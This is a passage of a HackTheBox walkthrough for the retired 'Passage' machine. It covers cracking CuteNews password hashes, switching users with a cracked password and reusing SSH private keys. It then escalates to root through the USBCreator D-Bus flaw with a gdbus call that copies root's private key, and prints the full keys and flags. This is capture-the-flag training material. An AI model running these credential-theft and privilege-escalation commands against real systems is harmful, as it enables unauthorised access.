4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc
                                                                                                                  
┌──(kali㉿kali)-[/mnt/…/share/hackthebox/Retired_machines/Passage_10.10.10.206]
└─$ tr ';' '\n' < lines.txt | grep 's:64' | cut -d ':' -f3 | sed -e 's/^"//' -e 's/"$//' > hashes.txt


```

We'll use [https://crackstation.net/](https://crackstation.net) to crack them, however, we only get two passwords out of the 5:

![](<../../.gitbook/assets/11 (2).JPG>)

Looking through the original decoded text, it looks like the password "atlanta1" is for "paul" and the other one is for a user that does not have a linux user account on the box.

Let's try switch user to "paul" using this password:

```
www-data@passage:/var/www/html/CuteNews/cdata/users$ su paul
su paul
Password: atlanta1

paul@passage:/var/www/html/CuteNews/cdata/users$ id
id
uid=1001(paul) gid=1001(paul) groups=1001(paul)
paul@passage:/var/www/html/CuteNews/cdata/users$ 
```

Nice, it works, and we can grab the user flag.

```
paul@passage:/var/www/html/CuteNews/cdata/users$ cd ~
cd ~
paul@passage:~$ cat user.txt
cat user.txt
3a9ba9a4a68b18fcdb7f6c38ac68f573
paul@passage:~$ 
```

There is a /home/paul/.ssh directory, which contains the private key for "paul". Let's copy this to our attacker box and use it to SSH into the target.

```
paul@passage:~/.ssh$ cat id_rsa
cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAs14rHBRld5fU9oL1zpIfcPgaT54Rb+QDj2oAK4M1g5PblKu/
+L+JLs7KP5QL0CINoGGhB5Q3aanfYAmAO7YO+jeUS266BqgOj6PdUOvT0GnS7M4i
Z2Lpm4QpYDyxrgY9OmCg5LSN26Px948WE12N5HyFCqN1hZ6FWYk5ryiw5AJTv/kt
rWEGu8DJXkkdNaT+FRMcT1uMQ32y556fczlFQaXQjB5fJUXYKIDkLhGnUTUcAnSJ
JjBGOXn1d2LGHMAcHOof2QeLvMT8h98hZQTUeyQA5J+2RZ63b04dzmPpCxK+hbok
sjhFoXD8m5DOYcXS/YHvW1q3knzQtddtqquPXQIDAQABAoIBAGwqMHMJdbrt67YQ
eWztv1ofs7YpizhfVypH8PxMbpv/MR5xiB3YW0DH4Tz/6TPFJVR/K11nqxbkItlG
QXdArb2EgMAQcMwM0mManR7sZ9o5xsGY+TRBeMCYrV7kmv1ns8qddMkWfKlkL0lr
lxNsimGsGYq10ewXETFSSF/xeOK15hp5rzwZwrmI9No4FFrX6P0r7rdOaxswSFAh
zWd1GhYk+Z3qYUhCE0AxHxpM0DlNVFrIwc0DnM5jogO6JDxHkzXaDUj/A0jnjMMz
R0AyP/AEw7HmvcrSoFRx6k/NtzaePzIa2CuGDkz/G6OEhNVd2S8/enlxf51MIO/k
7u1gB70CgYEA1zLGA35J1HW7IcgOK7m2HGMdueM4BX8z8GrPIk6MLZ6w9X6yoBio
GS3B3ngOKyHVGFeQrpwT1a/cxdEi8yetXj9FJd7yg2kIeuDPp+gmHZhVHGcwE6C4
IuVrqUgz4FzyH1ZFg37embvutkIBv3FVyF7RRqFX/6y6X1Vbtk7kXsMCgYEA1WBE
LuhRFMDaEIdfA16CotRuwwpQS/WeZ8Q5loOj9+hm7wYCtGpbdS9urDHaMZUHysSR
AHRFxITr4Sbi51BHUsnwHzJZ0o6tRFMXacN93g3Y2bT9yZ2zj9kwGM25ySizEWH0
VvPKeRYMlGnXqBvJoRE43wdQaPGYgW2bj6Ylt18CgYBRzSsYCNlnuZj4rmM0m9Nt
1v9lucmBzWig6vjxwYnnjXsW1qJv2O+NIqefOWOpYaLvLdoBhbLEd6UkTOtMIrj0
KnjOfIETEsn2a56D5OsYNN+lfFP6Ig3ctfjG0Htnve0LnG+wHHnhVl7XSSAA9cP1
9pT2lD4vIil2M6w5EKQeoQKBgQCMMs16GLE1tqVRWPEH8LBbNsN0KbGqxz8GpTrF
d8dj23LOuJ9MVdmz/K92OudHzsko5ND1gHBa+I9YB8ns/KVwczjv9pBoNdEI5KOs
nYN1RJnoKfDa6WCTMrxUf9ADqVdHI5p9C4BM4Tzwwz6suV1ZFEzO1ipyWdO/rvoY
f62mdwKBgQCCvj96lWy41Uofc8y65CJi126M+9OElbhskRiWlB3OIDb51mbSYgyM
Uxu7T8HY2CcWiKGe+TEX6mw9VFxaOyiBm8ReSC7Sk21GASy8KgqtfZy7pZGvazDs
OR3ygpKs09yu7svQi8j2qwc7FL6DER74yws+f538hI7SHBv9fYPVyw==
-----END RSA PRIVATE KEY-----
paul@passage:~/.ssh$ 

```

On out attacker box:

```
└─$ nano paul_id_rsa

└─$ chmod 600 paul_id_rsa

└─$ ssh -i paul_id_rsa paul@10.10.10.206
Last login: Sun Nov 21 05:37:19 2021 from 10.10.14.6
paul@passage:~$
```

## Enumeration as "paul"

Looking in the /home/paul/.ssh directory again, we see the file "authorized\_keys", and if we look at it, we that it contains a key for user "nadav":

```
paul@passage:~/.ssh$ cat authorized_keys 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage

```

This means that we should be able to SSH to the target as the user "nadav" using the private key owned by the user "paul". Let's try it:

```
└─$ ssh -i paul_id_rsa nadav@10.10.10.206
Last login: Mon Aug 31 15:07:54 2020 from 127.0.0.1
nadav@passage:~$ id
uid=1000(nadav) gid=1000(nadav) groups=1000(nadav),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
nadav@passage:~$
```

We could also just SSH locally. This is handy if the service is only listening on localhost.

```
paul@passage:~/.ssh$ ssh -i id_rsa nadav@127.0.0.1
Last login: Mon Aug 31 15:07:54 2020 from 127.0.0.1
nnadav@passage:~$ id
uid=1000(nadav) gid=1000(nadav) groups=1000(nadav),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
nadav@passage:~$ 
```

## Enumeration as "nadav"

Let's download linpeas.sh to the target and run it. We see the following output right near the beginning of the output:

```
╔══════════╣ USBCreator
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation                                                                                                          
Vulnerable!!                                                                                                      

```

A quick google search for "USBCreator privilege escalation" leads us to the following article:

[https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)

According to the article, we can abuse the functionality provided by the USBCreator D-Bus interface if we are in the "sudo" group to bypass the sudo security policy. We can use this to read any file owned by root and create a copy of the file.

## Privilege Escalation

Let's use the above vulnerability to copy the private SSH key for the "root" user to a file in our home directory.​ ​ ​ ​ ​&#x20;

```
nadav@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /home/nadav/root_privkey true
()
nadav@passage:~$ cat root_privkey 
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAth1mFSVw6Erdhv7qc+Z5KWQMPtwTsT9630uzpq5fBx/KKzqZ
B7G3ej77MN35+ULlwMcpoumayWK4yZ/AiJBm6FEVBGSwjSMpOGcNXTL1TClGWbdE
+WNBT+30n0XJzi/JPhpoWhXM4OqYLCysX+/b0psF0jYLWy0MjqCjCl/muQtD6f2e
jc2JY1KMMIppoq5DwB/jJxq1+eooLMWVAo9MDNDmxDiw+uWRUe8nj9qFK2LRKfG6
U6wnyQ10ANXIdRIY0bzzhQYTMyH7o5/sjddrRGMDZFmOq6wHYN5sUU+sZDYD18Yg
ezdTw/BBiDMEPzZuCUlW57U+eX3uY+/Iffl+AwIDAQABAoIBACFJkF4vIMsk3AcP
0zTqHJ1nLyHSQjs0ujXUdXrzBmWb9u0d4djZMAtFNc7B1C4ufyZUgRTJFETZKaOY
8q1Dj7vJDklmSisSETfBBl1RsiqApN5DNHVNIiQE/6CZNgDdFTCnzQkiUPePic8R
P1St2AVP1qmMvVimDFSJoiOEUfzidepXEEUQrByNmOJDtewMSm4aGz60ced2XCBr
GTt/wyo0y5ygRJkUcC+/o4/r2DQdrjCbeuyzAzzhFKQQx6HN5svzpi0jOWC0cB0W
GmAp5Q7fIFhuGyrxShs/BEuQP7q7Uti68iwEh2EZSlaMcBFEJvirWtIO7U3yIHYI
HnNlLvECgYEA7tpebu84sTuCarHwASAhstiCR5LMquX/tZtHi52qKKmYzG6wCCMg
S/go8DO8AX5mldkegD7KBmTeMNPKp8zuE8s+vpErCBH+4hOq6U1TwZvDQ2XY9HBz
aHz7vG5L8E7tYpJ64Tt8e0DcnQQtW8EqFIydipO0eLdxkIGykjWuYGsCgYEAwzBM
UZMmOcWvUULWf65VSoXE270AWP9Z/XuamG/hNpREDZEYvHmhucZBf1MSGGU/B7MC
YXbIs1sS6ehDcib8aCVdOqRIqhCqCd1xVnbE0T4F2s1yZkct09Bki6EuXPDo2vhy
/6v6oP+yT5z854Vfq0FWxmDUssMbjXkVLKIZ3skCgYAYvxsllzdidW3vq/vXwgJ7
yx7EV5tI4Yd6w1nIR0+H4vpnw9gNH8aK2G01ZcbGyNfMErCsTNUVkIHMwUSv2fWY
q2gWymeQ8Hxd4/fDMDXLS14Rr42o1bW/T6OtRCgt/59spQyCJW2iP3gb9IDWjs7T
TjZMUz1RfIARnr5nk5Q7fQKBgGESVxJGvT8EGoGuXODZAZ/zUQj7QP4B2G5hF2xy
T64GJKYeoA+z6gNrHs3EsX4idCtPEoMIQR45z/k2Qry1uNfOpUPxyhWR/g6z65bV
sGJjlyPPAvLsuVTbEfYDLfyY7yVfZEnU7Os+3x4K9BfsU7zm3NIB/CX/NGeybR5q
a7VJAoGANui4oMa/9x8FSoe6EPsqbUcbJCmSGPqS8i/WZpaSzn6nW+636uCgB+EP
WOtSvOSRRbx69j+w0s097249fX6eYyIJy+L1LevF092ExQdoc19JTTKJZiWwlk3j
MkLnfTuKj2nvqQQ2fq+tIYEhY6dcSRLDQkYMCg817zynfP0I69c=
-----END RSA PRIVATE KEY-----
nadav@passage:~$ 
```

Copy the private key to our attacker box, chmod it and connect to the target as root. We can also grab the root flag to finish the box.

```
└─$ ssh -i ~/Downloads/passage/root_key root@passage.htb
Last login: Mon Aug 31 15:14:22 2020 from 127.0.0.1
root@passage:~# id
uid=0(root) gid=0(root) groups=0(root)
root@passage:~# cat root.txt 
916d98a1b5fa454e44d50761a7c94973
root@passage:~#
```

## Resources

{% embed url="https://book.hacktricks.xyz/linux-unix/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation" %}

{% embed url="https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop" %}

{% embed url="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS" %}

